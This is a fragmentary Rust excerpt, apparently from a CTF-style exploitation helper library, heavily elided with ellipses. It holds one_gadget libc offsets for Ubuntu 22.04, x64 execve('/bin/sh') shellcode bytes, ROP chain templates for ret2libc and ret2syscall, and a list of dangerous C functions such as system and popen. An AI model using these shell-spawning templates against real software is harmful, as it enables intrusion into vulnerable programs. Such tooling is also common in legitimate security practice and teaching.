...
impl QuickHelpers {
    ...
    pub fn one_gadgets(version: &str) -> Vec<u64> {
        match version {
            ...
            "ubuntu_22.04" => vec![0x50a47, 0xebcf5, 0x10a41c],
    ...
    pub fn shellcode_template(arch: &str, shell_type: &str) -> Vec<u8> {
        match (arch, shell_type) {
            ("x64", "execve_sh") => vec![
                ...
                0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, // push rbx
    ...
    pub fn rop_template_ret2libc(pop_rdi: u64, ret: u64, system: u64, bin_sh: u64) -> Vec<u64> {
        vec![
            ret, // Stack alignment
    ...
    pub fn rop_template_ret2syscall(
        ...
        vec![
            ...
            pop_rdi, bin_sh, pop_rsi, 0, pop_rdx, 0, syscall,
        ]
    }
    ...
    pub fn dangerous_functions() -> Vec<&'static str> {
        vec![
            ...
            "system", "exec", "popen", "printf",   // Format string
